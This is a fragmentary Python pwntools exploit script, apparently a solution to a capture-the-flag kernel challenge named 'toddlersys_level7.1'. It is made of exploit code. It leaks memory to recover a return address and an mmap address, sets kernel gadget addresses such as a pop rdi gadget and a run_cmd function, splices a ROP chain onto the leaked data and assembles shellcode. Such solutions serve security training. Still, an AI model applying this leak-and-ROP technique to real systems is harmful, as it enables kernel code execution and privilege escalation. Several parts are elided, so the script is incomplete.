...
run_cmd_arg_yanasm = ""
for j in cmd:
    run_cmd_arg_yanasm += run_cmd_arg_yanasm_f.format(hex(j), hex(i))
    i+=1

from pwn import *
import psutil
BINARY = "/challenge/toddlersys_level7.1"
PID = 211
...
ret_rip = leak_info[0x190 - 0xff: 0x190 - 0xff + 0x8]
yancode_mmap_addr  = leak_info[0x1: 0x9]

pop_rdi_addr = 0xffffffff81001518
run_cmd = 0xFFFFFFFF81089B30
...
exp = leak_info[0:0x190 - 0xff] + rop_chain
...
shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, 0x20, 0x04, 0x9b))
